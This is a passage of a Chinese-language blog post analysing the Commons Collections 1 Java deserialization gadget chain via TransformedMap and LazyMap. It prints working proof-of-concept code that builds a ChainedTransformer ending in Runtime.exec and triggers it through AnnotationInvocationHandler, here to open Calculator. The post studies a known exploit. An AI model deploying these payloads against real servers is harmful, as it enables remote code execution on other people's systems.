+</span></span><span class="line"><span class="cl">        <span class="n">Class</span><span class="o">&lt;?&gt;[]</span> <span class="n">superInterfaces</span> <span class="o">=</span> <span class="n">type</span><span class="o">.</span><span class="na">getInterfaces</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(!</span><span class="n">type</span><span class="o">.</span><span class="na">isAnnotation</span><span class="o">()</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">            <span class="n">superInterfaces</span><span class="o">.</span><span class="na">length</span> <span class="o">!=</span> <span class="n">1</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">            <span class="n">superInterfaces</span><span class="o">[</span><span class="n">0</span><span class="o">]</span> <span class="o">!=</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">annotation</span><span class="o">.</span><span class="na">Annotation</span><span class="o">.</span><span class="na">class</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="n">AnnotationFormatError</span><span class="o">(</span><span class="s">&#34;Attempt to create proxy for a non-annotation type.&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">type</span> <span class="o">=</span> <span class="n">type</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">memberValues</span> <span class="o">=</span> <span class="n">memberValues</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></div><p>我们可以按住ctrl+H查看继承Annotation的类：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/commonscollections1_chain_analysis/5.png" alt="5"></p>
+<p>随便选一个都可以的，完整的代码如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">()),</span>
+</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;exec&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span> <span class="o">{</span><span class="s">&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;</span><span class="o">}),</span>
+</span></span><span class="line"><span class="cl">        <span class="o">};</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Map</span> <span class="n">innerMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">innerMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;111&#34;</span><span class="o">,</span><span class="s">&#34;test&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">outerMap</span> <span class="o">=</span>  <span class="n">TransformedMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">innerMap</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">chainedTransformer</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Constructor</span> <span class="n">AnnotationInvocationHandlerConstructor</span> <span class="o">=</span><span class="n">c</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">AnnotationInvocationHandlerConstructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">InvocationHandler</span> <span class="n">handler</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span> <span class="n">AnnotationInvocationHandlerConstructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">SOAPMessageHandlers</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">outerMap</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">ByteArrayOutputStream</span> <span class="n">barr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ObjectOutputStream</span> <span class="n">oss</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">barr</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">oss</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">handler</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">oss</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">barr</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">()));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+</span></span></code></pre></div><p>但是执行后会报错：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Exception</span> <span class="n">in</span> <span class="n">thread</span> <span class="s">&#34;main&#34;</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">NotSerializableException</span><span class="o">:</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span>
+</span></span></code></pre></div><p>为什么呢，因为<code>Runtime</code>的构造函数是private属性的，所以我们还得使用反射的方式进行编写：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"> <span class="n">Class</span> <span class="n">d</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Method</span> <span class="n">cMethmod</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">&#34;getRuntime&#34;</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">Object</span> <span class="n">se</span> <span class="o">=</span> <span class="n">cMethmod</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">Method</span> <span class="n">exec</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">&#34;exec&#34;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">se</span><span class="o">,</span> <span class="s">&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;</span><span class="o">);</span>
+</span></span></code></pre></div><p>改写成InvokerTransformer对象的调用方式，如果对理的new Class有疑问可以去看下该方法的传入的参数类型：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
+</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;getMethod&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">&#34;getRuntime&#34;</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
+</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;invoke&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
+</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;exec&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span> <span class="o">{</span><span class="s">&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;</span><span class="o">}),</span>
+</span></span><span class="line"><span class="cl">        <span class="o">};</span>
+</span></span><span class="line"><span class="cl">  <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Map</span> <span class="n">innerMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">  <span class="n">innerMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;111&#34;</span><span class="o">,</span><span class="s">&#34;test&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">outerMap</span> <span class="o">=</span>  <span class="n">TransformedMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">innerMap</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">chainedTransformer</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Constructor</span> <span class="n">AnnotationInvocationHandlerConstructor</span> <span class="o">=</span><span class="n">c</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">AnnotationInvocationHandlerConstructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">InvocationHandler</span> <span class="n">handler</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span> <span class="n">AnnotationInvocationHandlerConstructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">SOAPMessageHandlers</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">outerMap</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">ByteArrayOutputStream</span> <span class="n">barr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">  <span class="n">ObjectOutputStream</span> <span class="n">oss</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">barr</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">oss</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">handler</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">oss</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">barr</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">()));</span>
+</span></span><span class="line"><span class="cl">  <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+</span></span></code></pre></div><p>再次运行后发现还是没弹出计算器了，我们在readObject上面上一个断点，可以看到传过来memberType的值是null，所以没有执行下去：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/commonscollections1_chain_analysis/6.png" alt="6"></p>
+<p>我们继续往下走到这里会发现它会对比一个value的hash值，如果不一致那就会返回null：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/commonscollections1_chain_analysis/7.png" alt="7"></p>
+<p>所以我们要在put的那里加上写入value的值，也就是我们选取了@SOAPMessageHandlers注解作为<code>this.type</code>，我们就必须向<code>this.memberValues</code>写入一个<code>value：xxx</code>的键值对</p>
+<p>这里的<code>this.type</code>是可以变动的，比如换成另一个元注释<code>Retention.class</code>（虽然他的注解元素名也是value），甚至可以自定义，但是对方服务器上没有这个注释，打别人是没有用的，所以还是选用大家都有的元注释。</p>
+<p>同时我们写入的<code>this.memberValues</code>的键名不能改变，但是值可以改变。：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="nd">@interface</span> <span class="n">SOAPMessageHandlers</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SOAPMessageHandler</span><span class="o">[]</span> <span class="nf">value</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>完整的代码如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
+</span></span><span class="line"><span class="cl">      <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;getMethod&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">&#34;getRuntime&#34;</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
+</span></span><span class="line"><span class="cl">      <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;invoke&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
+</span></span><span class="line"><span class="cl">      <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;exec&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span> <span class="o">{</span><span class="s">&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;</span><span class="o">}),</span>
+</span></span><span class="line"><span class="cl">    <span class="o">};</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Map</span> <span class="n">innerMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">innerMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;value&#34;</span><span class="o">,</span><span class="s">&#34;test&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">outerMap</span> <span class="o">=</span>  <span class="n">TransformedMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">innerMap</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">chainedTransformer</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Constructor</span> <span class="n">AnnotationInvocationHandlerConstructor</span> <span class="o">=</span><span class="n">c</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">AnnotationInvocationHandlerConstructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">InvocationHandler</span> <span class="n">handler</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span> <span class="n">AnnotationInvocationHandlerConstructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">SOAPMessageHandlers</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">outerMap</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ByteArrayOutputStream</span> <span class="n">barr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ObjectOutputStream</span> <span class="n">oss</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">barr</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">oss</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">handler</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">oss</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">barr</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">()));</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+</span></span></code></pre></div><h2 id="0x03-lazymap链分析">0x03 LazyMap链分析</h2>
+<p>我们上面了解到了TransformedMap链的整个过程，在<a href="https://github.com/frohoff/ysoserial">ysoserial</a>里面用的是LazyMap的链，这个会稍微复杂一点，但整体和TransformedMap差不多，整条链如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Gadget chain:
+</span></span><span class="line"><span class="cl">		ObjectInputStream.readObject()
+</span></span><span class="line"><span class="cl">			AnnotationInvocationHandler.readObject()
+</span></span><span class="line"><span class="cl">				Map(Proxy).entrySet()
+</span></span><span class="line"><span class="cl">					AnnotationInvocationHandler.invoke()
+</span></span><span class="line"><span class="cl">						LazyMap.get()
+</span></span><span class="line"><span class="cl">							ChainedTransformer.transform()
+</span></span><span class="line"><span class="cl">								ConstantTransformer.transform()
+</span></span><span class="line"><span class="cl">								InvokerTransformer.transform()
+</span></span><span class="line"><span class="cl">									Method.invoke()
+</span></span><span class="line"><span class="cl">										Class.getMethod()
+</span></span><span class="line"><span class="cl">								InvokerTransformer.transform()
+</span></span><span class="line"><span class="cl">									Method.invoke()
+</span></span><span class="line"><span class="cl">										Runtime.getRuntime()
+</span></span><span class="line"><span class="cl">								InvokerTransformer.transform()
+</span></span><span class="line"><span class="cl">									Method.invoke()
+</span></span><span class="line"><span class="cl">										Runtime.exec()
+</span></span></code></pre></div><p>其实在TransformedMap利用起来感觉会方便很多因为可以直接利用AnnotationInvocationHandler对象的setValue方法进行反序列化。但是LazyMap也是一样用到transform的方法，我们来看一下具体代码，可以看到containsKey是不含该键名就执行factory的transform的方法：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"> <span class="kd">public</span> <span class="n">Object</span> <span class="nf">get</span><span class="o">(</span><span class="n">Object</span> <span class="n">key</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// create value for key if key is not currently in the map
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="o">(</span><span class="n">map</span><span class="o">.</span><span class="na">containsKey</span><span class="o">(</span><span class="n">key</span><span class="o">)</span> <span class="o">==</span> <span class="kc">false</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="n">factory</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">value</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">map</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></div><p>但是没有能在LazyMap找到一个checkSetValue的方法然后去执行setValue，而且在readObject也没有调用到get的方法。所以按照ysoserial的用法，就找到另外一条路，也就是AnnotationInvocationHandler类的invoke方法有调用到get：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="n">Object</span> <span class="nf">invoke</span><span class="o">(</span><span class="n">Object</span> <span class="n">proxy</span><span class="o">,</span> <span class="n">Method</span> <span class="n">method</span><span class="o">,</span> <span class="n">Object</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">member</span> <span class="o">=</span> <span class="n">method</span><span class="o">.</span><span class="na">getName</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Class</span><span class="o">&lt;?&gt;[]</span> <span class="n">paramTypes</span> <span class="o">=</span> <span class="n">method</span><span class="o">.</span><span class="na">getParameterTypes</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Handle Object and Annotation methods
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="o">(</span><span class="n">member</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&#34;equals&#34;</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">paramTypes</span><span class="o">.</span><span class="na">length</span> <span class="o">==</span> <span class="n">1</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">paramTypes</span><span class="o">[</span><span class="n">0</span><span class="o">]</span> <span class="o">==</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">equalsImpl</span><span class="o">(</span><span class="n">args</span><span class="o">[</span><span class="n">0</span><span class="o">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">paramTypes</span><span class="o">.</span><span class="na">length</span> <span class="o">!=</span> <span class="n">0</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="n">AssertionError</span><span class="o">(</span><span class="s">&#34;Too many parameters for an annotation method&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">switch</span><span class="o">(</span><span class="n">member</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="s">&#34;toString&#34;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">toStringImpl</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="s">&#34;hashCode&#34;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">hashCodeImpl</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="s">&#34;annotationType&#34;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">type</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Handle annotation member accessors
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">Object</span> <span class="n">result</span> <span class="o">=</span> <span class="n">memberValues</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">member</span><span class="o">);</span> <span class="c1">//在这里用到了get的方法
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">result</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="n">IncompleteAnnotationException</span><span class="o">(</span><span class="n">type</span><span class="o">,</span> <span class="n">member</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">result</span> <span class="k">instanceof</span> <span class="n">ExceptionProxy</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="o">((</span><span class="n">ExceptionProxy</span><span class="o">)</span> <span class="n">result</span><span class="o">).</span><span class="na">generateException</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">result</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">isArray</span><span class="o">()</span> <span class="o">&amp;&amp;</span> <span class="n">Array</span><span class="o">.</span><span class="na">getLength</span><span class="o">(</span><span class="n">result</span><span class="o">)</span> <span class="o">!=</span> <span class="n">0</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">result</span> <span class="o">=</span> <span class="n">cloneArray</span><span class="o">(</span><span class="n">result</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">result</span><span class="o">;</span>
